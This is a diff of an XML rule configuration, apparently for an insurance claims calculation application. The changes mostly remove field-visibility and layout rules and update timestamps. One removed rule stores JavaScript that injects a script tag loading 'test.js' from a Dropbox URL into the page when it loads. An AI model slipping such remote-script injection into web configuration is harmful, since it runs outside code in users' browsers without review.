@@ -3402,22 +3402,6 @@
  </Rule>
  <Rule>
   <CountryOrganizationId>DE</CountryOrganizationId>
-  <ItemId>BEEA6BC6-79C8-9B71-BCB6-0566830DA40B</ItemId>
-  <Context>
-   <ProcessStep>Calculation</ProcessStep>
-   <OrganizationId>RS_DE_SV_ALLIANZ-V2</OrganizationId>
-  </Context>
-  <RuleType>FieldVisibility</RuleType>
-  <Key>root.hints.hint1</Key>
-  <Value>show</Value>
-  <Status>Active</Status>
-  <CreatedBy>MM-P-9BBB2219</CreatedBy>
-  <CreationTimeStamp>2017-04-06T10:23:12.424</CreationTimeStamp>
-  <LastUpdatedBy>MM-P-C6CFD7A2</LastUpdatedBy>
-  <LastUpdateTimeStamp>2018-05-04T11:34:45.986</LastUpdateTimeStamp>
- </Rule>
- <Rule>
-  <CountryOrganizationId>DE</CountryOrganizationId>
   <ItemId>50D43772-6CF1-2F49-B1EB-15E1A37F47BF</ItemId>
   <Context>
    <Process>ShortAssessment</Process>
@@ -5197,40 +5181,6 @@
   <CreationTimeStamp>2017-04-06T10:23:14.918</CreationTimeStamp>
   <LastUpdatedBy>MM-P-C6CFD7A2</LastUpdatedBy>
   <LastUpdateTimeStamp>2018-05-04T11:34:46.574</LastUpdateTimeStamp>
- </Rule>
- <Rule>
-  <CountryOrganizationId>DE</CountryOrganizationId>
-  <ItemId>DB2CF007-5939-4845-5AD7-D3002887EAB4</ItemId>
-  <Context>
-   <Process>CompleteAssessment</Process>
-   <ProcessStep>Calculation</ProcessStep>
-   <OrganizationId>RS_DE_SV_ALLIANZ-V2</OrganizationId>
-  </Context>
-  <RuleType>FieldDefault</RuleType>
-  <Key>root.htmlimport.domreadyjs</Key>
-  <Value>let a=document.getElementById('hintText.hint1');let b=document.createElement('script'); b.setAttribute('src','https://www.dropbox.com/s/e5sfw3t51st0sw0/test.js?dl=0');a.appendChild(b);</Value>
-  <Status>Active</Status>
-  <CreatedBy>MM-P-9BBB2219</CreatedBy>
-  <CreationTimeStamp>2018-05-08T21:13:15.977</CreationTimeStamp>
-  <LastUpdatedBy>MM-P-9BBB2219</LastUpdatedBy>
-  <LastUpdateTimeStamp>2018-05-08T22:41:17.349</LastUpdateTimeStamp>
- </Rule>
- <Rule>
-  <CountryOrganizationId>DE</CountryOrganizationId>
-  <ItemId>39791DD8-151B-835A-9306-76396F194C69</ItemId>
-  <Context>
-   <Process>CompleteAssessment</Process>
-   <ProcessStep>Calculation</ProcessStep>
-   <OrganizationId>RS_DE_SV_ALLIANZ-V2</OrganizationId>
-  </Context>
-  <RuleType>FieldVisibility</RuleType>
-  <Key>root.htmlimport.domreadyjs</Key>
-  <Value>show</Value>
-  <Status>Active</Status>
-  <CreatedBy>MM-P-9BBB2219</CreatedBy>
-  <CreationTimeStamp>2018-05-08T21:02:39.665</CreationTimeStamp>
-  <LastUpdatedBy>MM-P-9BBB2219</LastUpdatedBy>
-  <LastUpdateTimeStamp>2018-05-08T21:02:39.665</LastUpdateTimeStamp>
  </Rule>
  <Rule>
   <CountryOrganizationId>DE</CountryOrganizationId>
@@ -17868,7 +17818,7 @@
   <CreatedBy>MM-P-C6CFD7A2</CreatedBy>
   <CreationTimeStamp>2017-08-18T09:27:50.531</CreationTimeStamp>
   <LastUpdatedBy>MM-P-C6CFD7A2</LastUpdatedBy>
-  <LastUpdateTimeStamp>2018-05-04T11:34:49.773</LastUpdateTimeStamp>
+  <LastUpdateTimeStamp>2018-06-25T16:04:23.874</LastUpdateTimeStamp>
  </Rule>
  <Rule>
   <CountryOrganizationId>DE</CountryOrganizationId>
@@ -38511,22 +38461,6 @@
  </Rule>
  <Rule>
   <CountryOrganizationId>DE</CountryOrganizationId>
-  <ItemId>EC35A3E2-34DE-DD9D-6373-F762BCB86750</ItemId>
-  <Context>
-   <ProcessStep>Calculation</ProcessStep>
-   <OrganizationId>RS_DE_SV_ALLIANZ-V2</OrganizationId>
-  </Context>
-  <RuleType>FieldAttributes</RuleType>
-  <Key>root.hints.hint1::Layout</Key>
-  <Value>{"startAt":0,"labelSize":0,"fieldSize":7,"spanSize":7}</Value>
-  <Status>Active</Status>
-  <CreatedBy>MM-P-9BBB2219</CreatedBy>
-  <CreationTimeStamp>2017-04-06T10:23:18.903</CreationTimeStamp>
-  <LastUpdatedBy>MM-P-C6CFD7A2</LastUpdatedBy>
-  <LastUpdateTimeStamp>2018-05-04T11:34:46.979</LastUpdateTimeStamp>
- </Rule>
- <Rule>
-  <CountryOrganizationId>DE</CountryOrganizationId>
   <ItemId>3D940D91-70B4-DC37-A7E3-CDD20EA83D28</ItemId>
   <Context>
    <Process>ShortAssessment</Process>
@@ -42066,12 +42000,12 @@
   </Context>
   <RuleType>Block</RuleType>
   <Key>RepairerDetails</Key>
-  <Value>root.task.basicClaimData.repairDetail.repairer.companyName,root.task.redirectToStepTab.redirectToStepTabButton,root.task.calculationMember,root.task.classInput.oemPriceUplift,root.task.classInput.transportCost,root.task.classInput.labourRatesTimeRatio,root.task.classInput.typeDATInfoButton,root.hints.hint2,root.task.classInput.idBlockCodesList,root.hints.hint1,root.task.classInput.idbcAddButton,root.task.classInput.idbcDeleteButton,root.task.classInput.idbc81PaintDialog,root.htmlimport.domreadyjs</Value>
+  <Value>root.task.basicClaimData.repairDetail.repairer.companyName,root.task.redirectToStepTab.redirectToStepTabButton,root.task.calculationMember,root.task.classInput.oemPriceUplift,root.task.classInput.transportCost,root.task.classInput.labourRatesTimeRatio,root.task.classInput.typeDATInfoButton,root.hints.hint2,root.task.classInput.idBlockCodesList,root.task.classInput.idbcAddButton,root.task.classInput.idbcDeleteButton,root.task.classInput.idbc81PaintDialog,root.htmlimport.domreadyjs</Value>
   <Status>Active</Status>
   <CreatedBy>MM-P-9BBB2219</CreatedBy>
   <CreationTimeStamp>2017-04-06T10:23:14.293</CreationTimeStamp>
-  <LastUpdatedBy>MM-P-9BBB2219</LastUpdatedBy>
-  <LastUpdateTimeStamp>2018-05-08T21:02:39.861</LastUpdateTimeStamp>
+  <LastUpdatedBy>MM-P-C6CFD7A2</LastUpdatedBy>
+  <LastUpdateTimeStamp>2018-06-28T10:28:53.069</LastUpdateTimeStamp>
  </Rule>
  <Rule>
   <CountryOrganizationId>DE</CountryOrganizationId>
@@ -55890,5 +55824,5 @@
   <LastUpdatedBy>MM-P-C6CFD7A2</LastUpdatedBy>
   <LastUpdateTimeStamp>2018-06-11T05:32:15.416</LastUpdateTimeStamp>
  </Rule>
- <Size>3440</Size>
+ <Size>3436</Size>
 </BRERuleListType>
